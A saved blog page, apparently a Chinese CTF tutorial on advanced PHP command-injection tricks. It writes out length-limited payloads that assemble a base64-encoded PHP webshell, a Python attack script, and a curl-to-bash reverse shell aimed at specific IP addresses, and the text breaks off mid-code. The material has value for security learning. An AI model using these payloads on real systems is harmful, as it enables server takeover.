@@ -1,0 +1,1060 @@
+
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noodp" />
+    <title>rce_进阶 - Sc0fie1d</title><meta name="Description" content="scofield&#39;s blog"><meta property="og:title" content="rce_进阶" />
+<meta property="og:description" content="进阶版rce_payload" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://scofield1920.github.io/rce_advanced/" /><meta property="og:image" content="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-11-17T00:00:00+08:00" />
+<meta property="article:modified_time" content="2023-12-17T15:38:11+08:00" /><meta property="og:site_name" content="Hugo DoIt Theme Documentation" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico"/>
+
+<meta name="twitter:title" content="rce_进阶"/>
+<meta name="twitter:description" content="进阶版rce_payload"/>
+<meta name="application-name" content="scofield-blog">
+<meta name="apple-mobile-web-app-title" content="scofield-blog">
+
+<meta name="theme-color" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="http://scofield1920.github.io/rce_advanced/" /><link rel="prev" href="http://scofield1920.github.io/reverse-antidbg/" /><link rel="next" href="http://scofield1920.github.io/pngcrc/" />
+<link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/color.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><meta name="google-site-verification" content="MQ8DNu27ayX6B_4ObiEDK09vGr1fdy7kOAnbd09hJk4" /><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "rce_进阶",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/scofield1920.github.io\/rce_advanced\/"
+        },"image": ["http:\/\/scofield1920.github.io\/images\/Apple-Devices-Preview.png"],"genre": "posts","keywords": "web, manual","wordcount":  787 ,
+        "url": "http:\/\/scofield1920.github.io\/rce_advanced\/","datePublished": "2023-11-17T00:00:00+08:00","dateModified": "2023-12-17T15:38:11+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": {
+                    "@type": "ImageObject",
+                    "url": "http:\/\/scofield1920.github.io\/images\/avatar.webp",
+                    "width":  528 ,
+                    "height":  560 
+                }},"author": {
+                "@type": "Person",
+                "name": "Sc0fie1d"
+            },"description": ""
+    }
+    </script><script src="//instant.page/5.2.0" defer type="module" integrity="sha384-jnZyxPjiipYXnSU0ygqeac2q7CVYMbh84q0uHVRRxEtvFPiQYbXWUorga2aqZJ0z"></script>
+</head>
+
+<body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">
+        function setTheme(theme) {document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark'); window.theme = theme;   window.isDark = window.theme !== 'light' }
+        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
+        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
+        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('auto' === 'light' || 'auto' === 'dark' || 'auto' === 'black') setTheme('auto'), saveTheme('auto'); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
+        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
+        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
+        window.switchThemeEventSet = new Set()
+    </script>
+    <div id="back-to-top"></div>
+    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Sc0fie1d"><span class="header-title-pre"><i class='far fa-edit fa-fw'></i></span><span id="desktop-header-typeit" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/links/"> Links </a><a class="menu-item" href="/about/"> About </a><a class="menu-item" href="https://github.com/scofield1920" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw"></i>
+                    <select class="color-theme-select" id="theme-select-desktop" title="Switch Theme">
+                        <option value="light">Light</option>
+                        <option value="dark">Dark</option>
+                        <option value="black">Black</option>
+                        <option value="auto">Auto</option>
+                    </select>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Sc0fie1d"><span class="header-title-pre"><i class='far fa-edit fa-fw'></i></span><span id="mobile-header-typeit" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/links/" title="">Links</a><a class="menu-item" href="/about/" title="">About</a><a class="menu-item" href="https://github.com/scofield1920" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i></a><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw"></i>
+                <select class="color-theme-select" id="theme-select-mobile" title="Switch Theme">
+                    <option value="light">Light</option>
+                    <option value="dark">Dark</option>
+                    <option value="black">Black</option>
+                    <option value="auto">Auto</option>
+                </select>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+            <div class="container"><div class="toc" id="toc-auto">
+        <h2 class="toc-title">Contents</h2>
+        <div class="toc-content" id="toc-content-auto"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#字符数量限制bypass">字符数量限制bypass</a></li>
+        <li><a href="#无回显rce">无回显rce</a></li>
+        <li><a href="#字符数量限制bypass2">字符数量限制bypass2</a></li>
+      </ul>
+    </li>
+    <li><a href="#无字母数字rce">无字母数字rce</a>
+      <ul>
+        <li><a href="#异域构造">异域构造</a></li>
+        <li><a href="#自增构造">自增构造</a></li>
+        <li><a href="#取反构造">取反构造</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+    </div><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC", "true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">rce_进阶</h1><div class="post-meta">
+            <div class="post-meta-line">
+                <span class="post-author"><span class="author fas fa-user-circle fa-fw"></span><a href="/" title="Author" rel=" author" class="author">Sc0fie1d</a>
+                </span>&nbsp;<span class="post-category">included in </span>&nbsp;<span class="post-category">categories <a href="/categories/web/"><i class="far fa-folder fa-fw"></i>web</a>&nbsp;<a href="/categories/manual/"><i class="far fa-folder fa-fw"></i>manual</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2023-11-17">2023-11-17</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2023-12-17">2023-12-17</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;787 words&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;4 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#字符数量限制bypass">字符数量限制bypass</a></li>
+        <li><a href="#无回显rce">无回显rce</a></li>
+        <li><a href="#字符数量限制bypass2">字符数量限制bypass2</a></li>
+      </ul>
+    </li>
+    <li><a href="#无字母数字rce">无字母数字rce</a>
+      <ul>
+        <li><a href="#异域构造">异域构造</a></li>
+        <li><a href="#自增构造">自增构造</a></li>
+        <li><a href="#取反构造">取反构造</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>进阶版rce_payload</p>
+<h3 id="字符数量限制bypass" class="headerLink">
+    <a href="#%e5%ad%97%e7%ac%a6%e6%95%b0%e9%87%8f%e9%99%90%e5%88%b6bypass" class="header-mark"></a>字符数量限制bypass</h3><p>题目限制了命令的长度，只能7个字符。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$sandbox</span> <span class="o">=</span> <span class="nx">dirname</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;/sandbox_&#39;</span> <span class="o">.</span> <span class="nx">md5</span><span class="p">(</span><span class="s2">&#34;orange&#34;</span> <span class="o">.</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REMOTE_ADDR&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">mkdir</span><span class="p">(</span><span class="nv">$sandbox</span><span class="p">,</span><span class="mo">0755</span><span class="p">,</span><span class="k">true</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">chdir</span><span class="p">(</span><span class="nv">$sandbox</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">])</span> <span class="o">&lt;=</span> <span class="mi">7</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="o">@</span><span class="nx">exec</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;reset&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="o">@</span><span class="nx">exec</span><span class="p">(</span><span class="s1">&#39;/bin/rm -rf &#39;</span> <span class="o">.</span> <span class="nv">$sandbox</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>我们可以利用Linux命令特性，来写入一句话木马</p>
+<p>每次提交不超过7个字符的命令，写入一句话木马的执行语句到文件名，然后通过<code>sh a ls -t</code>，利用文件名组成写入一句话木马的命令</p>
+<p>要写入的一句话木马：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> <span class="k">eval</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>base64编码后:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">PD9waHAgZXZhbCgkX0dFVFsxXSk7
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>最终需要被执行的语句：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">echo PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d&gt;1.php
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后将语句分拆，输出为文件名：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&gt;hp
+</span></span><span class="line"><span class="cl">&gt;1.p\\
+</span></span><span class="line"><span class="cl">&gt;d\&gt;\\
+</span></span><span class="line"><span class="cl">&gt;\ -\\
+</span></span><span class="line"><span class="cl">&gt;e64\\
+</span></span><span class="line"><span class="cl">&gt;bas\\
+</span></span><span class="line"><span class="cl">&gt;7\|\\
+</span></span><span class="line"><span class="cl">&gt;XSk\\
+</span></span><span class="line"><span class="cl">&gt;Fsx\\
+</span></span><span class="line"><span class="cl">&gt;dFV\\
+</span></span><span class="line"><span class="cl">&gt;kX0\\
+</span></span><span class="line"><span class="cl">&gt;bCg\\
+</span></span><span class="line"><span class="cl">&gt;XZh\\
+</span></span><span class="line"><span class="cl">&gt;AgZ\\
+</span></span><span class="line"><span class="cl">&gt;waH\\
+</span></span><span class="line"><span class="cl">&gt;PD9\\
+</span></span><span class="line"><span class="cl">&gt;o\ \\
+</span></span><span class="line"><span class="cl">&gt;ech\\
+</span></span><span class="line"><span class="cl">ls -t&gt;0
+</span></span><span class="line"><span class="cl">sh 0
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>用python打payload，把上面的payload写入execpayload.txt里面</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://xxxxx/index.php?cmd=</span><span class="si">{0}</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+]start attack!!!&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;execpayload.txt&#34;</span><span class="p">,</span> <span class="s2">&#34;r&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*]&#34;</span> <span class="o">+</span> <span class="n">url</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="o">.</span><span class="n">strip</span><span class="p">()))</span>
+</span></span><span class="line"><span class="cl">        <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="o">.</span><span class="n">strip</span><span class="p">()))</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>最终会在目录下生成1.php，里面就是一句话木马</p>
+<p>如果是五位字符限制，则最后用</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&gt;ls\\
+</span></span><span class="line"><span class="cl">ls&gt;a
+</span></span><span class="line"><span class="cl">&gt;\ \\
+</span></span><span class="line"><span class="cl">&gt;-t\\
+</span></span><span class="line"><span class="cl">&gt;\&gt;0
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">ls&gt;&gt;a
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">sh a
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>四位：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&gt;f\&gt;
+</span></span><span class="line"><span class="cl">&gt;ht-
+</span></span><span class="line"><span class="cl">&gt;sl
+</span></span><span class="line"><span class="cl">&gt;dir
+</span></span><span class="line"><span class="cl">*&gt;v
+</span></span><span class="line"><span class="cl">&gt;rev
+</span></span><span class="line"><span class="cl">*v&gt;0
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">cat 0
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>这里是利用Linux的命令特性，起初在windows下搭建的环境需要修改成windows的终端命令</strong></p>
+<h3 id="无回显rce" class="headerLink">
+    <a href="#%e6%97%a0%e5%9b%9e%e6%98%berce" class="header-mark"></a>无回显rce</h3><p>无回显rce是远程服务器上执行命令后，前段不会显示执行结果。这个时候需要使用curl或反弹shell进行绕过</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$c</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">system</span><span class="p">(</span><span class="nv">$c</span><span class="o">.</span><span class="s2">&#34; &gt;/dev/null 2&gt;&amp;1&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>无回显可以通过增加参数sleep进行判断</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ls|sleep 10 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>如返回时间有明显差异，则代表命令执行成功。
+对于无参数RCE，可以使用反弹shell</p>
+<h3 id="字符数量限制bypass2" class="headerLink">
+    <a href="#%e5%ad%97%e7%ac%a6%e6%95%b0%e9%87%8f%e9%99%90%e5%88%b6bypass2" class="header-mark"></a>字符数量限制bypass2</h3><p>curl反弹shell：利用curl的反弹shell技巧，构造反弹shell语句，利用curl 访问目标地址|hash，执行目标地址上的反弹shell语句。</p>
+<p>例题：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">error_reporting</span><span class="p">(</span><span class="k">E_ALL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$sandbox</span> <span class="o">=</span> <span class="nx">dirname</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;/sandbox_&#39;</span> <span class="o">.</span> <span class="nx">md5</span><span class="p">(</span><span class="s2">&#34;orange&#34;</span> <span class="o">.</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REMOTE_ADDR&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">mkdir</span><span class="p">(</span><span class="nv">$sandbox</span><span class="p">,</span><span class="mo">0755</span><span class="p">,</span><span class="k">true</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">chdir</span><span class="p">(</span><span class="nv">$sandbox</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">])</span> <span class="o">&lt;=</span> <span class="mi">6</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">exec</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;reset&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">exec</span><span class="p">(</span><span class="s1">&#39;/bin/rm -rf &#39;</span> <span class="o">.</span> <span class="nv">$sandbox</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>利用vps，搭建80服务，存入反弹shell的语句，效果如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">访问：http://81.71.84.61/
+</span></span><span class="line"><span class="cl">显示：bash -i &gt;&amp; /dev/tcp/219.152.63.100/8000 0&gt;&amp;1
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>利用linux特性写入一句话木马，由于限制字符数量限制，此处分开两部分执行。</p>
+<p>用于接收shell的机器要开启端口监听</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">nc -lv 8000
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>第一部分：</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt;ls<span class="se">\\</span>
+</span></span><span class="line"><span class="cl">ls&gt;_
+</span></span><span class="line"><span class="cl">&gt;<span class="se">\ \\</span>
+</span></span><span class="line"><span class="cl">&gt;-t<span class="se">\\</span>
+</span></span><span class="line"><span class="cl">&gt;<span class="se">\&gt;</span>y
+</span></span><span class="line"><span class="cl">ls&gt;&gt;_
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>此部分主要是分两段，写入文件<code>_</code>中。首先写入<code>ls</code>字符，然后追加写入<code>-t &gt;y</code>，这样执行<code>sh _</code>，即执行<code>ls -t &gt;y</code>。此语句等于0x09的<code>ls -t&gt;0</code></p>
+<p><strong>第二部分：</strong></p>
+<p>构造curl 81.71.84.61|bash（curl访问这个地址即返回bash -i &gt;&amp; /dev/tcp/219.152.63.100/8000 0&gt;&amp;1这句话），从而执行反弹shell</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
